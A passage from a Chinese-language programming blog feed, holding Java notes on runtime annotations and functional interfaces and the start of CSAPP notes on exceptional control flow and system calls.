运行时注解的处理</h3><p>由于其他两类注解一般用不到（编译时注解由编译器使用，因此我们一般只使用，不编写；加载时注解主要由底层工具库使用，涉及到class的加载，一般我们很少用到），因此此处仅叙述运行时注解的处理。</p><p>从现在开始，下文中的所有 “注解” 都指代 “运行时注解”。</p><p>我们知道，注解本身只是个注解，<u>如果你不做任何处理，那么它将对原本的代码毫无影响，就像注释一样。</u></p><p>我们还知道，注解只是一个 Java 类而已，但是这个类只存放一些参数，不与外界代码有任何关联。</p><p>所以处理注解的方法一目了然：<u>使用上一章介绍的反射机制</u>，不仅能找到所有规定类型的注解，还能让注解发挥指定的效果。</p><p>上一章中，我们只介绍了关于类型、接口的反射 API，这里我们补充一下针对注解的反射 API：</p><ul><li><p>判断 <code>Class</code> 对象本身是否描述的是注解：<code>public boolean isAnnotation();</code>；</p></li><li><p>判断注解是否存在于指定对象上：<code>isAnnotationPresent(&lt;Class Object of Annotation&gt;)</code>；</p><blockquote><p>这个方法在 <code>Class / Field / Method / Constructor</code> 类型中都有。</p></blockquote></li><li><p>从指定对象上获取注解对象：<code>getAnnotation(&lt;Class Object of Annotation&gt;)</code>；</p><blockquote><p>这个方法在 <code>Class / Field / Method / Constructor</code> 类型中都有。</p><p>注意：<u>可能会返回 <code>null</code>，所以使用前请用 <code>isAnnotationPresent</code> 检查！</u></p></blockquote></li><li><p>从方法 / 构造函数中获得参数注解对象：<code>getParameterAnnotations() -&gt; Annotation[][]</code>；</p><blockquote><p>只有在 <code>Method / Constructor</code> 中存在。</p></blockquote></li></ul><p>再回想一下，注解是个类型，里面装的全是传入参数，并且直接提供各个传入参数的访问器方法。</p><p>有了以上的知识，就能写一个自定义的注解了。</p><h3 id="5-2-3-实战：自定义一个运行时注解"><a href="#5-2-3-实战：自定义一个运行时注解" class="headerlink" title="5.2.3 实战：自定义一个运行时注解"></a>5.2.3 实战：自定义一个运行时注解</h3><p>考虑一个需求，我想定义一个修饰属性的运行时注解，如果这个参数是整数，就限制这个参数的范围为注解参数给定的范围；如果这个参数是字符串，那么限制的是字符串长度。其中最大、最小值可选。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* File: Range.java */</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">min</span><span class="params">()</span>: <span class="keyword">default</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">max</span><span class="params">()</span>: <span class="keyword">default</span> Integer.MAX_VALUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* File: RangeChecker.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RangeChecker</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(T obj)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        Class&lt;?&gt; objCls = obj.getClass();</span><br><span class="line">        <span class="keyword">for</span> (Field f: objCls.getFields()) &#123;</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (f.isAnnotationPresent(Range.class)) &#123;</span><br><span class="line">                <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> f.getAnnotation(Range.class);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">originVal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    originVal = f.get(obj);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException err) &#123;</span><br><span class="line">                    <span class="comment">/* Controls never reaches here. */</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (originVal <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid field: &quot;</span> + f.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (originVal <span class="keyword">instanceof</span> Integer i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; range.min() || i &gt; range.max()) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid field: &quot;</span> + f.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考一下，<code>RangeChecker</code> 应该什么时候被使用？没错，这取决于你的业务逻辑。注解是 “惰性的”，只有你显式调用注解处理方法，注解的处理才会开始。</p><h1 id="Chapter-6-Functional-Interface"><a href="#Chapter-6-Functional-Interface" class="headerlink" title="Chapter 6. Functional Interface"></a>Chapter 6. Functional Interface</h1><h2 id="6-1-Definitions-and-Examples"><a href="#6-1-Definitions-and-Examples" class="headerlink" title="6.1 Definitions and Examples"></a>6.1 Definitions and Examples</h2><p>Java 中的一个重要特性：函数式接口。实际上，它的规范定义是：</p><p><strong><u>任何一个只存在单一抽象方法（SAM）的接口，都称之为函数接口</u></strong>。</p><p>函数接口提供了和 TypeScript 类似的能力，它让我们可以不那么看重函数签名，仅仅从函数类型（参数、返回值类型）将函数归类。接口如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Function</span>&lt;T, R&gt; &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p>这还可以让我们轻易地将一个函数作为一个参数 / 返回值，实现函数式编程。</p><p>例如，我们可以显式声明使用函数接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function&lt;Integer, String&gt; intToString = Object::toString;</span><br><span class="line">Function&lt;String, String&gt; quote = s -&gt; <span class="string">&quot;&#x27;&quot;</span> + s + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compose 是函数接口的接口方法，可以将函数接口组合执行 */</span></span><br><span class="line">Function&lt;Integer, String&gt; quoteIntToString = quote.compose(intToString);</span><br><span class="line"><span class="comment">/* apply 是函数接口的接口方法，执行这个函数接口的实现 */</span></span><br><span class="line">assertEquals(<span class="string">&quot;&#x27;5&#x27;&quot;</span>, quoteIntToString.apply(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 再例如这段业务代码 */</span></span><br><span class="line"><span class="keyword">public</span> Optional&lt;EventDto&gt; <span class="title function_">findEventByUuid</span><span class="params">(Long uuid)</span> &#123;</span><br><span class="line">    Optional&lt;Event&gt; event = eventRepository.findByUuidAndNotDeleted(uuid);</span><br><span class="line">    <span class="comment">/* Optional.map 的参数就是一个函数接口，可以更方便、清晰地处理内容的映射关系 */</span></span><br><span class="line">    <span class="keyword">return</span> event.map(Event::mapToEventDto);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用 <code>new</code> 立即定义、实例化一个函数接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Java 中创建一个线程，其中参数类型 Runnable 就是一个函数接口 */</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;New thread created&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这种原地重载实例化接口的方法，我们可以称为匿名的接口实现。</span></span><br><span class="line"><span class="comment"> * 缺点是接口实现不能复用，优点是代码简洁。</span></span><br><span class="line"><span class="comment"> * 这对于其他任何 interface 都是可行的（不是函数接口也行） */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* P.S. 如果你写了上面的函数接口的匿名实现，在 IDEA 中会提醒你换成匿名函数更简洁 */</span></span><br><span class="line"><span class="comment">/* 这样 Java 就越来越像 TypeScript 了（bushi */</span></span><br></pre></td></tr></table></figure><p>此外，我们所熟知的 Java Lambda 函数（匿名函数）就是一种函数接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() -&gt; <span class="keyword">new</span> <span class="title class_">HelloClass</span>()</span><br></pre></td></tr></table></figure><p>除了匿名函数，一个类中的静态方法、在同一个类中使用的实例方法都能通过 <code>::</code> 作用域符来<strong><u>转换</u></strong>为函数接口，例如：</p><p>在任意一个类方法中使用 <code>Object::toString</code>（实例方法省略传递 <code>self</code>）、使用静态方法 <code>MyClass::aStaticMethod</code> 等等。</p><h2 id="6-2-Primitive-Function-Specializations"><a href="#6-2-Primitive-Function-Specializations" class="headerlink" title="6.2 Primitive Function Specializations"></a>6.2 Primitive Function Specializations</h2><p>对于 Java primitive types（基本类型），我们没法将它们作为 generic type argument（泛型参数），所以这个时候就必须这么定义基本类型的函数接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ShortToByteFunction</span> &#123;</span><br><span class="line">    <span class="type">byte</span> <span class="title function_">applyAsByte</span><span class="params">(<span class="type">short</span> s)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就能操作含有基本类型的函数，作为函数接口了！也可以把它作为参数、返回值，进行便捷的函数式操作。</p><blockquote><p>是不是越看越像 C++ 的函数指针？</p></blockquote><h2 id="6-3-Cosumers-amp-Suppliers"><a href="#6-3-Cosumers-amp-Suppliers" class="headerlink" title="6.3 Cosumers &amp; Suppliers"></a>6.3 Cosumers &amp; Suppliers</h2><p>Suppliers 在 Java 中定义为 <strong><u>不含参数、只有返回值的 函数接口</u></strong>。它常被用在：</p><ul><li><p>数据计算 / 大型对象创建等需要 Lazy Load 的场景，只是先拿到 supplier，真正需要结果的时候才进行计算，实现过程的解耦；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 举例：提供创建对象的方法 */</span></span><br><span class="line">() -&gt; <span class="keyword">new</span> <span class="title class_">ComplicatedClass</span>()</span><br></pre></td></tr></table></figure></li><li><p>大型序列的 Lazy Generate 的场景，类似 Python 的生成器/迭代器，只有获取下一个元素时才进行计算，极大节省资源，例如一个 Fibbonacci 生成器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] fibs = &#123;<span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">Stream&lt;Integer&gt; fibonacci = Stream.generate(() -&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> fibs[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">fib3</span> <span class="operator">=</span> fibs[<span class="number">0</span>] + fibs[<span class="number">1</span>];</span><br><span class="line">    fibs[<span class="number">0</span>] = fibs[<span class="number">1</span>];</span><br><span class="line">    fibs[<span class="number">1</span>] = fib3;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>Consumers 则与 Suppliers 相反，定义为 <strong><u>没有返回值、只含参数的 函数接口</u></strong>。它的应用场景比 Suppliers 更少，通常它隐含着 “side effect” 的含义。</p><p>我们也可以在日志逻辑中见到它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names.forEach(name -&gt; log.debug(<span class="string">&quot;Hello, &quot;</span> + name));</span><br></pre></td></tr></table></figure><h2 id="6-4-Predicates-amp-Operators"><a href="#6-4-Predicates-amp-Operators" class="headerlink" title="6.4 Predicates &amp; Operators"></a>6.4 Predicates &amp; Operators</h2><p>在数学上有对应概念的函数接口分别是谓词断言函数 和 操作符。</p><p>谓词断言函数（predicates），可以定义为 参数是一个或多个值、返回值为 boolean 类型的函数接口。在数学上对应的概念：谓词。</p><p>我们常常在 <code>filter</code>、<code>find</code> 这样的接口中见到，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; namesWithA = names.stream()</span><br><span class="line">  .filter(name -&gt; name.startsWith(<span class="string">&quot;A&quot;</span>)    <span class="comment">/* predicates */</span>)</span><br><span class="line">  .collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p>操作符（operators），可以定义为 参数（一个或多个）和返回值类型相同的函数接口。</p><p>我们经常在使用 Collection API 时能见到，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; values = Arrays.asList(<span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> values.stream()</span><br><span class="line">  .reduce(<span class="number">0</span>, (i1, i2) -&gt; i1 + i2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 或者 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;UserDto&gt; <span class="title function_">findUserByUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    List&lt;User&gt; res = userRepository.findUserByUsername(username);</span><br><span class="line">    <span class="keyword">return</span> res.stream()</span><br><span class="line">        .map(UserService::mapToUserDto)</span><br><span class="line">        .collect(Collectors.toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;i&gt;Reference: Oracle Documentation&lt;/i&gt;&lt;/p&gt;
&lt;h1 id=&quot;Chapter-3-Java-Record-amp-Java-Bean&quot;&gt;&lt;a href=&quot;#Chapter-3-Java-Record-amp-Java-Bean&quot; cl</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Java" scheme="https://blog.sjtuxhw.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Notes: ECF &amp; I/O</title>
    <link href="https://blog.sjtuxhw.top/review/csapp-ecf-io/"/>
    <id>https://blog.sjtuxhw.top/review/csapp-ecf-io/</id>
    <published>2024-04-16T05:58:54.000Z</published>
    <updated>2024-10-25T13:54:19.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-13-Exceptional-Control-Flow"><a href="#Chapter-13-Exceptional-Control-Flow" class="headerlink" title="Chapter 13. Exceptional Control Flow"></a>Chapter 13. Exceptional Control Flow</h1><blockquote><p>对应书中第 8 章。</p></blockquote><p>异常控制流是现代计算机系统的一个相当重要的部分。</p><h2 id="13-1-Control-Flow"><a href="#13-1-Control-Flow" class="headerlink" title="13.1 Control Flow"></a>13.1 Control Flow</h2><ul><li><p>控制流：从机器打开到关闭的过程中，处理器只做一件事：<strong>读指令、执行指令，一个周期做一个指令</strong>。多核的机器则每个核心依次交替执行指令。这些<strong>指令序列</strong>被称为控制流。硬件正在执行的<strong>实际指令序列</strong>就被称为<strong>物理控制流</strong>。</p></li><li><p>改变内存中控制流的方法：<strong>分支 &amp; 跳转</strong>，<strong>过程调用 &amp; 返回</strong>（Branches &amp; Jumps &amp; Procedure call and return）；</p><blockquote><p><strong>都是对于程序状态变化的处理</strong>。</p></blockquote></li></ul><p>但以上的简单的改变控制流的方法对于处理复杂的系统级别的状态变化时，就显得非常拙劣。（例如 OS 协同软硬件的通信，如果还是以 if-else 的方法，那将会非常差劲）；</p><p>什么是 “系统级别的状态变化”？</p><ul><li>数据从磁盘 / 网卡到达内存中；</li><li>I/O 设备输入 Ctrl+C；</li><li>系统分时复用的时钟到期了，接下来要打断当前执行的进程；</li><li>除零指令；</li><li>……</li></ul><p>这些事件不能指望应用程序的开发者来解决（应用程序的开发者只负责开发正常的程序控制流），而这应该是 OS 需要处理的事情。为了高效处理以上在执行程序中出现的或意外、或故意的系统级状态变更的情况，OS 有一套策略：<strong>异常控制流（Exception control flow，简称 ECF）</strong>来处理上述情况，这样很多事件就无需应用开发者来考虑了。</p><h2 id="13-2-Exception-Control-Flow-Overview"><a href="#13-2-Exception-Control-Flow-Overview" class="headerlink" title="13.2 Exception Control Flow: Overview"></a>13.2 Exception Control Flow: Overview</h2><p>异常控制流的重要特征之一在于，它们会改变系统级别的状态，<strong>而且存在于计算机系统的各个层级</strong>：</p><p>首先是底层级 ECF 的机制：</p><ol><li><strong>Exception</strong>（异常，又称 <strong>Hardware ECF（硬件异常控制流）</strong>，和我们平时编程的软件异常处理不是一个概念）<ul><li>作用：<strong>响应某些底层系统事件（A System Event）的控制流的变化</strong>；</li><li>实现方法：硬件与操作系统的配合；</li></ul></li></ol><p>再看高级别（既指抽象层面，又指逻辑层面，这意味着下面的机制可能利用到，或者包含了上面的 Exception）的 ECF 的机制：</p><ol><li><strong>Process Context Switch</strong>（进程上下文切换）<ul><li>作用：使操作系统在两个进程间无缝切换；</li><li>实现方法：硬件时钟和操作系统的配合；</li></ul></li><li><strong>Signals</strong>（信号）<ul><li>作用：应用、操作系统、硬件三者之间的异常（不是错误，而是指在上层应用程序正常控制流以外的部分）通信；</li><li>实现方法：操作系统控制；</li></ul></li><li><strong>Nonlocal Jumps</strong>（非本地跳转）<ul><li>作用：<strong>应用程序开发者层面（而非操作系统层面）主动更改程序正常控制流（上面介绍的分支跳转、调用返回），无视正常控制流的规则</strong>（例如不需要等到一个函数返回，就跳到另一个函数执行）；</li><li>实现方法：因为是用户级别，所以由 C library 提供：<code>setjmp()</code>、<code>longjmp()</code>；</li></ul></li></ol><p>了解完计算机中各个层面的 <strong>4 大类 ECF 机制</strong>，我们开始深入探讨各个机制的运作原理。</p><h2 id="13-3-Exception-Control-Flow-Exception"><a href="#13-3-Exception-Control-Flow-Exception" class="headerlink" title="13.3 Exception Control Flow: Exception"></a>13.3 Exception Control Flow: Exception</h2><h3 id="13-3-1-Definitions"><a href="#13-3-1-Definitions" class="headerlink" title="13.3.1 Definitions"></a>13.3.1 Definitions</h3><p>一个异常就是<strong>为了应对一些（软件 / 硬件的）事件，控制流由程序转移到 OS kernel 的过程</strong>。</p><blockquote><ol><li>什么是操作系统内核（OS Kernel）？</li></ol><p>内核是<strong>操作系统在内存中驻留的部分</strong>，你可以理解成当前加载到内存的、运行中的操作系统代码；</p><ol><li>Exception 定义中的 “事件” 具体有哪些？</li></ol><ul><li>除零、算数溢出、page fault（页错误）、I/O 请求完成、键盘设备输入 Ctrl + C；</li><li>……</li></ul></blockquote><h3 id="13-3-2-Process-Procedure"><a href="#13-3-2-Process-Procedure" class="headerlink" title="13.3.2 Process Procedure"></a>13.3.2 Process Procedure</h3><p>Exception 的处理过程如下：</p><p><img src="imgs/exception_flow.png" height="200px"></p><ol><li><p>如图所示，因为以上的事件（event）而改变了系统状态，执行到 $I_{current}$ 的用户代码被立即暂停，此时 exception 将控制权从用户代码转移到内核态代码。这部分内核代码被称为 <strong>exception handler（异常处理程序）</strong>；</p></li><li><p>接着，内核执行异常处理程序代码来处理这个事件，过程被称为 <strong>exception processing（异常处理）</strong>；</p></li><li><p>处理结束后，通常有 3 种情况：返回到原先被打断的指令位置（$I_{current}$，已执行）、返回到被打断的指令的下一条（$I_{next}$，未执行）、终止原用户程序执行。</p></li></ol><h3 id="13-3-3-Implementations-of-Exception"><a href="#13-3-3-Implementations-of-Exception" class="headerlink" title="13.3.3 Implementations of Exception"></a>13.3.3 Implementations of Exception</h3><p>前面介绍过，Exception 是由 OS 和硬件共同实现的，那么具体实现是什么？</p><p>事实上，控制流想要改变，必须依靠硬件改变程序计数器（PC，或者说前面提到的 <code>%rip</code>）。由于 Exception handler 的代码又位于 Kernel code 中，所以实现就很清楚了：</p><ol><li><p><strong>OS 负责组织 Exception Handler 的代码，来处理可能的 Exception</strong>；</p></li><li><p><strong>硬件负责在 Event 出现的时候改变 <code>%rip</code>，使控制流转向 Exception Handler</strong>；</p></li></ol><p>等等，还有一个问题，OS 会预先编写很多类 Exception Handler 以应对不同 Exception 的情况，那么硬件在 Event 发生时，怎么知道转向哪一个 Exception Handler？所以还有一条、再改正一条：</p><ol><li><p><strong>硬件负责在 Event 出现时按种类改变 Exception Table Base Register，通过这个寄存器取得 Exception Table 中存放的 Exception Handler 的地址（硬件规定是虚拟地址），把取得的地址置于 <code>%rip</code> 中，完成转向</strong>；</p></li><li><p>OS 负责在 Kernel 中组织 <strong>Exception Table（异常表）</strong>，告诉硬件何种 event 对应何种 Exception Handler 的地址；</p></li></ol><blockquote><p>什么是 异常表？</p><p>OS 为了将每种 Event 产生的 Exception 与 Exception Handler 对应起来，将每种类型的事件进行编号。<strong>每种类型的事件对应位于的 异常编号（Exception Number，又称为中断向量，Interrupt Vector）</strong>，这个编号被作为一个跳表的索引，而表中装的是各个对应的 Exception Handler 的地址。这个表就称为 <strong>异常表</strong>。</p><p><img src="imgs/exception_table.png" height="300px"></p></blockquote><h3 id="13-3-4-Types-of-Exceptions"><a href="#13-3-4-Types-of-Exceptions" class="headerlink" title="13.3.4 Types of Exceptions"></a>13.3.4 Types of Exceptions</h3><p>上面我们提到过，在 Exception 的处理过程中，最后可能会发生 3 种情况（$I_{current}$、$I_{next}$、abort），这是因为具体发生的 event 不同，其 Exception Handler 的处理方式也不同。所以，我们有必要了解一下 Exception（或者说对应的 event）有哪些种类，exception handler 的默认行为又有哪些。</p><p><strong>Asynchronous Exceptions（异步异常）：又称 Interrupt（中断）</strong></p><ul><li>引发的 Event 的种类：<strong>来自处理器外的事件。通常是 I/O 设备发出的</strong>；</li><li>例子：<ul><li>I/O 设备中断事件（数据从磁盘、网卡等外部设备已到达内存的通知，键盘 Ctrl+C 等）；</li><li>系统分时复用时钟中断（Timer Interrupt），OS 在硬件时钟中定时，要求从用户程序切换到内核中，以便让 OS 取得控制权（这个是<strong>为进程上下文切换提供条件</strong>，让系统决定是否要进行进程上下文切换）；</li></ul></li><li>触发方法 / 系统状态如何改变：电脉冲通知处理器的 <strong>中断引脚</strong>；</li><li>触发后默认行为：<ul><li>可能与当前运行程序无关事件，从 $I_{next}$ 继续向下运行（<strong>recoverable</strong>）；</li></ul></li></ul><p><strong>Synchronous Exceptions（同步异常）</strong></p><ul><li>引发的 Event 的种类：<strong>因为处理器执行某条指令而造成的事件</strong>；</li></ul><p>而同步异常又可以分为几个种类：</p><ol><li><p>Traps（陷阱）</p><ul><li><p>触发方法：<strong>执行程序故意触发系统级别 Exception</strong>；</p></li><li><p>例子：<strong>system calls（系统调用）、breakpoint traps（程序断点）、特殊指令</strong>；</p><blockquote><p><strong>什么是系统调用？</strong></p><p>应用程序的某些功能可能需要使用一些硬件设备，例如 I/O 设备。而这些驱动硬件的程序则嵌在 OS Kernel 中。</p><p>但另一方面，由于安全问题，人们在系统中划分了若干特权级：Ring 0 ~ Ring 3，数字越大，权限越低。应用程序运行在 Ring 3 级别，因此不能直接调用内核函数、无法访问内核数据（位于 Ring 0 级别），因此无法直接使用 I/O 设备。</p><p>那么应用程序为了完成一项使用 I/O 设备的工作，只能调用 OS 准备的专门的接口（称为系统服务）来通知 OS 协助完成。这个过程被称为 <strong>系统调用</strong>。</p><p><strong>系统调用的详细过程？</strong></p><p>首先，系统调用就是调用系统接口的过程，咱首先得了解 x86-64 架构下系统调用有哪些接口。以 x86-64 Linux 为例：</p><p><img src="imgs/system_calls.png" height="250px"></p><p>每一个系统调用接口都有一个唯一的编号，这个编号由 OS 分配，例如 <code>read</code> 是 0 号；</p><p>以打开文件这个 I/O 操作为例，应用程序想要将磁盘中的数据读到内存中，那么：</p><ol><li><p>程序先调用 C library 封装好的函数 <code>open/fopen</code>；</p></li><li><p>C library 的 <code>open/fopen</code> 经过几层包装，接着调用系统接口 <code>__open</code>（上面的 2 号系统调用），其汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000000e5d70 &lt;__open&gt;:</span><br><span class="line">...</span><br><span class="line">e5d79: b8 02 00 00 00         mov $0x2,%eax # openis syscall #2</span><br><span class="line">e5d7e: 0f 05                 syscall # Return value in %rax</span><br><span class="line">e5d80: 48 3d 01 f0 ff ff     cmp $0xfffffffffffff001,%rax</span><br><span class="line">...</span><br><span class="line">e5dfa: c3 retq</span><br></pre></td></tr></table></figure><p>我们可以看到，系统调用的 calling conventions 与普通函数不一样：</p><ul><li><strong>第一传入参数必须是 系统调用编号，并且存放在 <code>%rax</code> 中</strong>，这里是 2，表示 2 号系统调用；</li><li><strong>其他传入参数依此放在：<code>%rdi</code>、<code>%rsi</code>、<code>%rdx</code>、<code>%r10</code>、<code>%r8</code>、<code>%r9</code></strong>；</li><li><strong>返回值也放在 <code>%rax</code> 中</strong>；</li><li><strong>使用 <code>errno</code> 宏来记录系统调用的状态或错误情况</strong>；</li><li><strong><code>%rcx</code> 、<code>%r11</code> 可能被破坏：<code>%rcx</code> 存放 $I_{next}$ 地址方便返回，<code>%r11</code> 用于存放 <code>rflags</code>，也即当前程序的 conditional codes</strong>；</li></ul></li><li><p>当处理器执行到系统调用汇编指令时，触发 <code>Trap</code>（Exception），相应值传入 Exception Table Base Register；硬件通过该寄存器找到 Exception table 中的相应 Exception handler（x86-64 通常是 software interrupt exception handler），将 <code>%rip</code> 地址改为该 handler 的地址，于是控制流转向 OS Kernel；</p></li><li><p>OS Kernel 处理系统调用的 exception handler 会按之前的 conventions 读取各参数值，执行对应系统调用服务。完成后，先切换特权级等信息，再读取 <code>%rcx</code> 和 <code>%r11</code> 中的信息，将控制流转交给 user mode 中原程序的 $I_{next}$；</p></li><li><p>最终系统调用成功返回的话，open 返回一个 <strong>file descriptor（文件描述符，一个区别已打开文件的小整数编号）</strong>，以供后续读写调用使用。</p></li></ol></blockquote></li><li><p>触发后默认行为：从 $I_{next}$ 继续向下执行（<strong>recoverable</strong>）；</p></li></ul></li><li><p>Faults（错误）</p><ul><li><p>触发方法：程序执行了一条指令，<strong>无意引发了硬件或软件层面的问题</strong>，从而产生 Exception；</p></li><li><p>例子：<strong>page fault（页错误，possibly recoverable）</strong>、<strong>protection fault（访问权限错误，unrecoverable）</strong>，<strong>floating point exceptions（浮点异常，例如除零错，unrecoverable）</strong>；</p><blockquote><p><strong>什么是页错误 和 访问权限错误？</strong></p><p>首先计算机中存在两个部分物理内存和虚拟内存。操作系统为了将离散、有限的资源抽象为连续、近乎无限的资源给应用程序使用，并将各个程序隔离开，使用了复杂的策略。</p><p>在<strong>内存的使用</strong>层面，操作系统和硬件配合引入了 “虚拟内存” 的概念，操作系统维护了一个从物理内存（简称 